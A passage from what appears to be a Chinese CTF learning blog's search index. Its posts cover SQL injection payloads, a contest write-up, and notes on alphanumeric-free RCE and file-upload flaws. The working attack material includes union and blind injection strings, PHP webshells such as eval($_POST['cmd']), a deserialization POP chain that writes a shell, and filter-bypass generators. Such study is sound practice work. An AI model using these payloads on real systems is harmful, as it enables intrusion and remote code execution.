floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。\n结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！\n\n参考他人博客\n自我总结：可以理解为在group by 读取数据并且保存在临时表的过程中由于floor（random(0)*2）会出现0和1的性质那么在检测时就会出现security0和security1但是在写入临时表的过程中又被计算了一遍也就是说security0写入可能变成security1，那这时候就重复了，重复就会报错告诉你security1重复了那你也就得到了数据库名了。注意的是可能也就是说有时候需要多次刷新才会显示\n套路公式\npayload：?id=-1&#x27; union select count(*),2,concat((select database()),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+ 这里把查询库的名字命名为a\n\n?id=-1&#x27; union select count(*),2,concat(&#x27;*&#x27;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+  \n\n布尔盲注布尔盲注主要利用的是查询语句执行中的真假\n 步骤&quot;: &quot;1. 确认注入点&quot;,&quot;操作&quot;: &quot;测试 AND 1=1 和 AND 1=2 的页面差异&quot;,&quot;示例&quot;: &quot;id=1 AND 1=1 → 正常页面\\n        id=1 AND 1=2 → 异常页面&quot;\n\n由于真假回显页面不同的问题我们就可以进行布尔盲注\n猜测数据库长度?id&#x3D;1’ and length(database())&#x3D;8– -猜测数据库名的第一个字母id&#x3D;1’ and left(database(),1)&gt;’a’ – -id&#x3D;1’ and left(database(),1)&gt;’z’ – -数据库中的第一个表名id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D; database() limit a,1),b,1))&gt;na是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数\n时间盲注布尔盲注变种，在页面真假不会变化的情况下添加时间延迟的条件使得我们可以通过页面的延迟判断真假\npayload：?id=1&#x27; and if(length(database())=8,sleep(5),1)-- - （如果数据库的长度等于8，则休眠5秒）?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  （如果第一个表的第一个字母为a，则休眠5秒）\n\nsqli-lab靶场搭建：https://www.zhihu.com/question/564387094/answer/3362337250\n关于用户名加密码的sql（万能密码）用户名or密码注入：1’ or 1&#x3D;1#(用户名写1是有可能被识别成类似id&#x3D;1的形式)\nfrom 后面是对象名\nwhere后面是表名等字符串值\n双写绕过在某种过滤场景下题目会过滤掉特殊关键词比如or by将他们替换为空字符，其实所谓双写绕过就是把原本的or破坏掉在里面插入会被删掉的or 和 by测试出被删掉的是什么有针对性的插入就行。\n","tags":["sql"]},{"title":"中航大新生赛wp","url":"/2025/11/01/%E4%B8%AD%E8%88%AA%E5%A4%A7%E6%96%B0%E7%94%9F%E8%B5%9Bwp/","content":"新生赛WEB_SSRF_MAIN一个披着SSRF外皮的目录穿越\n\n进来看见皮卡丘还有图片获取，没找到端口有点怀疑放的图片所以我们去看看源码\n\n很明显的SSRF\n\n当你尝试直接访问的时候你就会被拦截回来你改ip也没有用\n这时候就想到了我们可以访问api下的image文件中的任意图片那么也就意味着我们可以通过目录穿越看到前面目录的东西\n\n\n\nhttp://223.254.144.227:21282/api/fetch-image?url=http://127.0.0.1:8888/api/image/../lists\n\n成功访问\n\nhttp://223.254.144.227:21282/api/fetch-image?url=http://127.0.0.1:8888/api/image/../flaaaag\n\nWEB-REV-RCE前面尝试了非常多的过滤手段，最后发现了它只能执行一条命令且不能有间隔符存在什么意思呢\n\n这时候我们去查环境变量\n\nhttp://223.254.144.227:21206/exec?cmd=env\n\nweb5-简单的文件包含这题fuzz工具出了点小问题于是想着自己先试试万一猜出来了呢，就试了最常用的file，\n?file=123\n\n404，那就是找到了\n直接读取flag.php\nhttp://223.254.144.227:21349/?file=flag.php\n\n结束\nweb6-文件上传的门槛这个是根据提示做出来的因为它有include.php去执行，首先你要创建一个图片马\n#define width 1#define height 1  &lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;//创建为.txt\n\ncopy /b 1.jpg + shell.txt shell.jpg//指令\n\n生成图片马上传然后在include.php里面去用指定路径执行命令\n\nWEB7伪造本地ip就行\n\nweb8-任意文件下载根据提示存在history文件目录穿越加上常见文件夹猜测找到payload\n../../../../root/.bash_history\n\n下载文件审计后发现写入flag的命令\n\nmycookie前端代码调用执行查看页面源码就能看见\n&lt;script&gt;     // 使用原生Fetch API替代axios，避免外部依赖     document.getElementById(&#x27;loginForm&#x27;).addEventListener(&#x27;submit&#x27;, async function(e) &#123;         e.preventDefault();                  const username = document.getElementById(&#x27;username&#x27;).value.trim();         const password = document.getElementById(&#x27;password&#x27;).value.trim();         const errorMsg = document.getElementById(&#x27;errorMsg&#x27;);                  errorMsg.style.display = &#x27;none&#x27;;                  try &#123;             // 第一步：验证用户名和密码             const formData = new FormData();             formData.append(&#x27;username&#x27;, username);             formData.append(&#x27;password&#x27;, password);                          const verifyResponse = await fetch(&#x27;/api/login/verify&#x27;, &#123;                 method: &#x27;POST&#x27;,                 body: formData             &#125;);                          const verifyResult = await verifyResponse.json();                          if (verifyResult.code !== 200) &#123;                 errorMsg.textContent = verifyResult.msg;                 errorMsg.style.display = &#x27;block&#x27;;                 return;             &#125;                          // 第二步：获取Cookie（仅使用用户名）             const cookieResponse = await fetch(&#x27;/api/login/get-cookie&#x27;, &#123;                 method: &#x27;POST&#x27;,                 headers: &#123;                     &#x27;Content-Type&#x27;: &#x27;application/json&#x27;                 &#125;,                 body: JSON.stringify(&#123; username: verifyResult.username &#125;)             &#125;);                          const cookieResult = await cookieResponse.json();                          if (cookieResult.code !== 200) &#123;                 errorMsg.textContent = cookieResult.msg;                 errorMsg.style.display = &#x27;block&#x27;;                 return;             &#125;                          // 设置Cookie并跳转首页             document.cookie = `auth_token=$&#123;cookieResult.auth_token&#125;; path=/; max-age=3600`;             window.location.href = &#x27;/&#x27;;                      &#125; catch (error) &#123;             errorMsg.textContent = &#x27;Login failed. Please try again.&#x27;;             errorMsg.style.display = &#x27;block&#x27;;             console.error(&#x27;Login error:&#x27;, error);         &#125;     &#125;); &lt;/script&gt;\n\n16042\nfetch(&#x27;/api/login/get-cookie&#x27;, &#123;    method: &#x27;POST&#x27;,    headers: &#123;        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,    &#125;,    body: JSON.stringify(&#123;username: &quot;admin&quot;&#125;)&#125;).then(response =&gt; response.json()).then(data =&gt; &#123;    console.log(&quot;API Response:&quot;, data);            document.cookie = `auth_token=$&#123;data.auth_token&#125;; path=/; max-age=3600`;            &#125;);\n\n生成完直接去访问就行\nSpring藏在配置文件里\n\nUNSER&lt;?phpclass gogogo&#123;    public $www = &quot;Lets start! &quot;;    public function __destruct()    &#123;        echo $this-&gt;www;    &#125;&#125;class start&#123;    public $coffe;    public function __tostring()    &#123;        return $this-&gt;coffe-&gt;dense;    &#125;&#125;class soda&#123;    public $gunmu;    public function __get($content)    &#123;        $g = $this-&gt;gunmu;        return $g();    &#125;&#125;class end&#123;    public $content;    public $filename;    public function __invoke()    &#123;        file_put_contents($this-&gt;filename, &quot;&lt;?php exit();&quot; . $this-&gt;content);    &#125;&#125;if (isset($_GET[&#x27;p&#x27;])) &#123;    $ser = unserialize($_GET[&#x27;p&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n\n\n&lt;?phpclass gogogo &#123; public $www; &#125;class start &#123; public $coffe; &#125;class soda &#123; public $gunmu; &#125;class end &#123; public $content; public $filename; &#125;$end = new end();$end-&gt;filename = &#x27;php://filter/convert.base64-decode/resource=1.php&#x27;;  $end-&gt;content = &#x27;aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;;$soda = new soda();$soda-&gt;gunmu = $end;$start = new start();$start-&gt;coffe = $soda;$gogogo = new gogogo();$gogogo-&gt;www = $start;echo serialize($gogogo) . &quot;\\n\\n&quot;;?&gt;\n\nPOP链\ngogogo::__destruct -&gt; start::__toString -&gt; soda::__get -&gt; end::__invoke\n\nexit()的死亡绕过上网搜一搜base64编码绕过在我们的木马前面+a让前面的exit变成乱码将文件名写出php协议base64解码的形式\npayload：O:6:&quot;gogogo&quot;:1:&#123;s:3:&quot;www&quot;;O:5:&quot;start&quot;:1:&#123;s:5:&quot;coffe&quot;;O:4:&quot;soda&quot;:1:&#123;s:5:&quot;gunmu&quot;;O:3:&quot;end&quot;:2:&#123;s:7:&quot;content&quot;;s:41:&quot;aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;;s:8:&quot;filename&quot;;s:49:&quot;php://filter/convert.base64-decode/resource=1.php&quot;;&#125;&#125;&#125;&#125; \n\n\n\n这样就成功啦直接连接就行\nweb进阶题1用御剑扫了一下目录发现了登录端口一开始会被里面有的前端代码误导因为找半天你会发现你找不到里面可能有的已经加密的密码泄露所以怀疑有登录界面也就是register.html\n给的提示也是很明显要自己注册看了一下后台有一段前端代码被注释掉了\n仔细看你会发现这个就是注册表单，它是有action属性的接下来执行\nconsole.log(&#x27;=== 启用注册表单 ===&#x27;);const registerComments = [];const walker = document.createTreeWalker(    document.body,    NodeFilter.SHOW_COMMENT,    null,    false);let comment;while (comment = walker.nextNode()) &#123;    if (comment.textContent.includes(&#x27;registerForm&#x27;)) &#123;        registerComments.push(comment);    &#125;&#125;if (registerComments.length &gt; 0) &#123;    registerComments.forEach(comment =&gt; &#123;        const tempDiv = document.createElement(&#x27;div&#x27;);        tempDiv.innerHTML = comment.textContent;        comment.parentNode.replaceChild(tempDiv, comment);    &#125;);&#125; \n\n在控制台中执行得到\n\n这里建议用burpsuite去注册这样的话才能得到它后台给你的注册信息。\n\n主要看那个error这里是中文乱码扔给AI就知道它说啥了，这里我们会得到两个关键信息admin已经被注册了然后就是密码需要大写小写字母加数字后面就会有注册成功然后登入就行\nweb进阶题2在用户登录过后底下会有两个文章一个是关于弱口令的，一个是关于sql注入的，弱口令可以让我们登录admin_lang这个账号，然后我们就可以去用户查询里面去找sql漏洞啦。\n\n第一个payload验证sql注入漏洞的存在\n&#x27; or &#x27;1&#x27;=&#x27;1\n\n联合注入测试\n&#x27; UNION SELECT 1,2,3,4-- -\n\n&#x27; UNION SELECT 1,2,3,database()-- -\n\n&#x27; UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()-- -\n\n这里其实不确定在哪个里面我是都查了不过wp不多说flag在users里面\n&#x27; UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;-- -\n\n找到flag啦\ngroup_concat(flag) from users-- -\n\nweb进阶3主播其实先写的3写出来flag交不了2才发现自己先写的三哈哈哈哈\n三主要是在有个挑战的界面里面去看源码就很容易发现\n\n里面有AK和SK一开始我也不会\nhttps://blog.csdn.net/qq_34851291/article/details/140209099\n去看了这篇文章以后还误把加速服务给当成主机连接对象了（OSS Browser真的能登录的上但是你看不见任何东西因为会出现网络问题），不过这个也给我很大启发那就是云端服务就那么几个而且他们的AK是有明显特征的我可以去试试，于是我在行云管家这里找到了。\n\n这是一个华为云主机，对比公网ip你就会发现一模一样不过可惜的是应该是权限不够的问题所以我们没办法直接导入主机会失败。但是华为云肯定是有相应的登入方式的也就是OBS Browser+ AK SK登录以后你就会看到桶了\n\n\n\n结束。\n天才的疏忽hint 1\n\n\n\n进去以后直接登录就行\nhint2\n\nhint3\n\n\n\n前端代码执行或者直接访问都行\n\n找到你要构建的权限了\n\n有token这里是jwt加密，加密时需要密钥\n找密钥hint2去GitHub里面找\n\n\n\nWEB_REV_SQL此题在query里忘记过滤了列名直接查询password和username就行\nMISC似曾相识但又看不出来\n\n\n\n\n\nDNA,4的三次方联想到base64编码\n\n\n\n\n\n\n\nAI神力，一眼粥小写+空格\n第二个包是zip伪加密直接工具解开就行\n然后你会得到一张图片\n\n然后这个图片末端还隐藏了两张图片合理推测双图片盲水印\n36142\n\n相当可怕的flag\nwireshark的使用把那几个灰色的打开追踪流查看就行","tags":["比赛wp"]},{"title":"无字符数字RCE","url":"/2025/08/20/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE/","content":"无字母数字rce1.临时文件上传 原理：无字母数字要实现远程指令操作，也就是要想办法绕过网站过滤的指令，而通过post上传文件（和文件夹tmp联系一起，把指令直接在网站内的tmp中执行绕过了过滤的环节）此时php会在Linux里的临时文件夹保存文件，且文件一定是php加上6个随机的字符，6个随机字符会出现大写的情况，文件的位置是&#x2F;tmp&#x2F;php??????。根据6个字符会出现大写的情况，我们在编辑访问的时候要确保我们提交的东西被执行也就是匹配问题。无字母数字的条件下我们一般会使用glob通配符”？”去解决也就是**. &#x2F;???&#x2F;?????????(. &#x2F;tmp&#x2F;php??????)【这条指令的含义是php运行这个文件所在位置包含的东西（. &#x2F;表示执行**）】但是后面的9个“？”能够匹配的文件太多了，也就会导致无法执行到我们提交的文件。所以要根据上传文件后六个字符随机出现大写的特性去匹配，\n而glob支持使用类似[0-9]的形式去表达范围，那么类似我们可以查询ASCII码表\n\n可以发现表达所有大写字母可以用[@-[]去表示所以原来的指令写成. &#x2F;???&#x2F;????????[@-[]（表示最后一位字符是大写字母的情况），因为生成的后六位字符大写情况是随机的所以可能需要多次提交去匹配。\n实现临时文件上传构建html页面有关html的知识点1.构建网页的基本结构&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--对于中文网页需要使用此条声明编码有些浏览器会设置GBK为默认编码--&gt;&lt;title&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n2.一些常见的标签以及标签知识HTML标题\n&lt;h1&gt; 这是一段标题&lt;/h1&gt;&lt;h2&gt;           &lt;/h2&gt;\n\n\n\nHTML段落\n&lt;p&gt;这是一个段落 &lt;/p&gt;\nHTML链接\n&lt;a href=&quot;链接&quot;&gt;这是一个链接&lt;/a&gt;\nHTML图像\n&lt;img src=&quot;/images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;\n3.关于标签与元素\nHTML元素以开始标签起始 以结束标签终止。例子：  元素的内容在开始与结束标签之间\n2.构建文件上传网页&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;https://648cc2ce-53dc-47cb-b1b0-8fcdcbf1e724.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n下面代码是对网页做了一个大小的动态调整使得这个网页能够在任何设备上正常显示\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n\nform标签是创建表单，用于用户输入\naction属性是**标签的一个重要组成部分，它定义了当表单提交时，表单数据应该发送到哪里。这个属性的值可以是一个文件名，处理表单数据的脚本，或者是一个服务器的URL。\nenctype属性‌用于规定表单数据在发送到服务器之前如何进行编码。它主要有三个取值：\n1.application&#x2F;x-www-form-urlencoded：这是默认的编码方式，表单数据被编码为名称&#x2F;值对（即键值对），适用于大多数常规的表单提交。在这种编码方式下，所有字符都会进行编码，空格被编码为“+”号，特殊字符被编码为ASCII十六进制值‌12。\n2.‌multipart&#x2F;form-data‌：这种编码类型用于文件上传。表单数据被编码为一条消息，每个控件对应消息中的一个部分。这种编码方式不对字符进行编码，适用于包含文件上传控件的表单。使用这种编码方式时，必须配合POST方法提交表单‌12。\n3.‌text&#x2F;plain：表单数据以纯文本形式进行编码，不含任何控件或格式字符。这种编码方式较少使用‌\nlabel属性是一个标签为为 input 元素定义标注（标记）”for” 属性可把 label 绑定到另外一个元素。把 “for” 属性的值设置为相关元素的 id 属性的值。\ninput的功能取决于type，type&#x3D;file定义文件选择字段和 “浏览…” 按钮，供文件上传。\ntype&#x3D;submit定义提交按钮。\n3.burp截取上传请求并修改添加指令先ls查询当前目录文件 下图是ctfshow web56时添加的指令作为参考\n\n没有出现结果多发送几次原理上面有解释。\n思路：以下三种都是直接通过将原来指令一个字母一个字母用字符替换（通过运算公式去实现）的形式\n2.取反原理：每一个字母用“~“取反后得到的url编码再次取反还是它本身\n&lt;?php    $a=urlencode(~&#x27;php&#x27;)    echo $a;    echo &#x27;&lt;/br&gt;&#x27;;    $b=urlencode($a);    echo $b;    \n\n\n\n利用得到的url编码加上取反符号”~”可以绕过一些数字字母过滤\n3.异或这里先了解或运算”||“（”|“）和异或运算”^“\n或运算： 参加运算的两个对象，按二进制位进行“或”运算。\n运算规则：0|0&#x3D;0； 0|1&#x3D;1； 1|0&#x3D;1； 1|1&#x3D;1；即 ：参加运算的两个对象只要有一个为1，其值为1例如: 3|5 可写算式如下： 0000 0011 | 0000 0101 &#x3D; 0000 0111(十进制为7)因此，3|5的值为7。\n这里十进制算出来的可以是ASCII码值所以可以对字符进行运算\n异或运算：参加运算的两个数据，按二进制位进行“异或”运算。\n运算规则：0^0&#x3D;0； 0^1&#x3D;1； 1^0&#x3D;1； 1^1&#x3D;0；即：参加运算的两个对象，如果两个相应位为“异”（值不同），则该位结果为1，否则为0例如：9^5可写成算式如下： 00001001 ^ 00000101 &#x3D; 00001100 (十进制为12)因此，9^5的值为12。\n这里可以参考web42（url编码就是%加上对应字符ASCII码的16进制数）\nimport reimport urllibfrom urllib import parsehex_i = &quot;&quot;hex_j = &quot;&quot;pattern=&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;  #被过滤的字符str1=[&quot;system&quot;,&quot;cat flag.php&quot;] #需要输出的字母指令for p in range(2):    t1 = &quot;&quot;    t2 = &quot;&quot;    for k in str1[p]:        for i in range(256):#ASCII码表一共256个            for j in range(256):                if re.search(pattern,chr(i)) :#如果有过滤字符跳过一次第一次循环                    break                if re.search(pattern,chr(j)) :#如果有过滤字符跳过一次第二次循环                    continue                if i &lt; 16:                    hex_i = &quot;0&quot; + hex(i)[2:]#hex（）将整数转化为16进制数但是会有0x前缀所以从[2:]开始                else:                    hex_i=hex(i)[2:]                if j &lt; 16:                    hex_j=&quot;0&quot;+hex(j)[2:]                else:                    hex_j=hex(j)[2:]#以上代码都是在筛选可用字符对应的16进制码                hex_i=&#x27;%&#x27;+hex_i                hex_j=&#x27;%&#x27;+hex_j                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))#或运算然后再转为ASCII码表对应的字母 urlib.parse.unquote()为解码url返回它本身的字符串 ord（）是把字符串变成十进制数 chr是把十进制数变成ASCII码对应字符                if(c ==k):                    t1=t1+hex_i                    t2=t2+hex_j                    break            else:                continue            break    print(&quot;(\\&quot;&quot;+t1+&quot;\\&quot;|\\&quot;&quot;+t2+&quot;\\&quot;)&quot;)\n\n这里就是用到了或运算去绕过字母和数字过滤。\n同理我们也可以用异或的运算符号去替换判断条件\n当然异或也可以直接用符号运算去表示字母\nvar_dump(&#x27;#&#x27;^&#x27;|&#x27;); //得到字符 _`var_dump(&#x27;.&#x27;^&#x27;~&#x27;); //得到字符 P    var_dump(&#x27;/&#x27;^&#x27;&#x27;); //得到字符 0    var_dump(&#x27;|&#x27;^&#x27;/&#x27;); //得到字符 S    var_dump(&#x27;&#123;&#x27;^&#x27;/&#x27;); //得到字符 T    $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;\n\n\n\n\n\n\n\n4.自增$_++&#x3D;1因为在没有给定初值的情况下运行时会认问是false&#x3D;0然后再自增得到1 那么利用自增函数只要‘A’我们就可以用字符拿到所有的字母\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array\n这里面就有A\np神的构造\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);\n\n但是这个构造太长了局限性很大不是很好用，了解即可。\n","tags":["rce"]},{"title":"信息收集","url":"/2026/02/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","content":"信息收集写这篇的初衷是因为在比赛中有时候找不到突破口且容易忽略切入点。\n1.网站有备份文件：www.zip（可以直接用dirsearch扫描）\n2.java构建的网站在可以实现任意文件下载的情况下我们可以去查找**Javaweb的配置文件/WEB-INF/web.xml**下载（其描述了 servlet 和其他的应用组件配置及命名规则里面的.代表&#x2F;）在&#x2F;WEB-INF&#x2F;classes下载\n"},{"title":"文件上传","url":"/2025/12/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":"文件上传1.什么是文件上传漏洞文件上传漏洞实际是因为开发者对于用户文件上传部分的控制不足或者处理缺陷，从而导致了用户可以越过自身有的权限向服务器上传可执行的动态脚本文件（前提是服务器会执行），这里的文件可以是木马，病毒，恶意脚本或者webshell等等。这个漏洞的问题本身不在于文件上传，而是文件上传之后服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重后果。\n造成该漏洞的原因及原理原因：\n1.对于上传文件的后缀名没有严格过滤\n2.对于文件头，二进制内容等等，用于描述文件类型的表述方法没有做检查\n3.没有对文件做不可执行的权限的处理\n原理：\n在web中上传文件的原理是通过将表单设置为multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。\nHTML表单文件上传机制1.1 表单文件上传基础在Web应用中，文件上传是一种常见的用户交互形式，允许用户通过表单上传文件到服务器。HTML表单提供了  元素，让用户可以选择文件进行上传。一旦用户选择了一个或多个文件，这些文件将被包含在表单数据中，并通过POST方法提交至服务器指定的处理脚本。\n1.2 表单结构和提交机制一个典型的文件上传表单结构如下：\n&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;\n    &lt;input type=&quot;file&quot; name=&quot;fileToUpload&quot; id=&quot;fileToUpload&quot;&gt;\n    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;\n&lt;/form&gt;\n\nhtml\n在这个表单中， enctype 属性设置为 multipart&#x2F;form-data 是必须的，因为这是处理文件上传的正确编码类型。表单提交后，文件数据会被分割成多个部分，每个部分对应一个表单控件。 \n1.3上传过程前端(可能会有检查限制)-&gt;二进制流（这里会发生服务器端的检查也就是检查文件内容进行进一步的限制）-&gt;服务器解析-&gt;储存到服务器的相应位置\n访问时由于大部分网站会配置php解释器所以在访问.php文件的时候.php文件会被执行。\n用大家建的sqli-lab网站进行说明\n简单的上传页面（保存为.html文件）保存在大家建站的目录底下\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n服务器端处理文件的代码：保存为upload.php注意上头的连接上传到的就是我们的upload.php进行服务器端的处理创建文件夹等等\n&lt;?php// 1. 设置上传目录$uploadDir = &#x27;uploads/&#x27;;// 2. 创建目录（如果不存在）if (!file_exists($uploadDir)) &#123;    mkdir($uploadDir, 0777, true);&#125;// 3. 获取上传的文件信息$fileName = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];      // 原始文件名$tmpName = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];   // 临时文件路径$fileSize = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;];      // 文件大小$fileError = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;];    // 错误代码// 4. 检查是否有上传错误if ($fileError !== 0) &#123;    die(&quot;上传失败，错误代码: $fileError&quot;);&#125;// 5. 生成安全的文件名（防止中文乱码和重复）$safeFileName = time() . &#x27;_&#x27; . preg_replace(&#x27;/[^a-zA-Z0-9\\.]/&#x27;, &#x27;_&#x27;, $fileName);// 6. 移动文件到目标目录$destination = $uploadDir . $safeFileName;if (move_uploaded_file($tmpName, $destination)) &#123;    echo &quot;&lt;h3&gt;success&lt;/h3&gt;&quot;;    echo &quot;name: &quot; . $fileName . &quot;&lt;br&gt;&quot;;    echo &quot;size: &quot; . round($fileSize / 1024, 2) . &quot; KB&lt;br&gt;&quot;;    echo &quot;&lt;a href=&#x27;$destination&#x27;&gt;dowload&lt;/a&gt;&lt;br&gt;&lt;br&gt;&quot;;    echo &quot;&lt;a href=&#x27;index.html&#x27;&gt;return&lt;/a&gt;&quot;;&#125; else &#123;    echo &quot;false！&quot;;&#125;?&gt;\n\n打开准备上传即可。\n2.我们要上传些什么？一句话木马登场~木马是什么？计算机木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。木马程序表面上是无害的，甚至对没有警戒的用户还颇有吸引力，它们经常隐藏在游戏或图形软件中，但它们却隐藏着恶意。这些表面上看似友善的程序运行后，就会进行一些非法的行动，如删除文件或对硬盘格式化。完整的木马程序一般由两部分组成：一个是服务器端，一个是控制器端。“中了木马”就是指安装了木马的服务器端程序，若你的电脑被安装了服务器端程序，则拥有相应客户端的人就可以通过网络控制你的电脑。为所欲为。这时你电脑上的各种文件、程序，以及在你电脑上使用的账号、密码无安全可言了。\n一句话木马&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n这个一句话木马是什么意思呢\n它实际上是一个php代码所以它必须写在里面才能被服务器认出来才会被解析执行\n@是执行错误也不报错因为我们上传的cmd实际上是一个变量变量没有被定义是用不了的所以会报错，@存在的意义就是让我们的木马能够被正常执行\n这句话的意思是什么呢？\n我们上传了一个cmd的超全局变量供我们使用，且这个变量是以POST形式接受我们上传的参数的\n（网站的参数上传有GET和POST两种方式）\ncmd=header(&quot;Content-type:text/html;charset=gbk&quot;);exec(&quot;ipconfig&quot;,$out);echo &#x27;&lt;pre&gt;&#x27;;print_r($out);echo 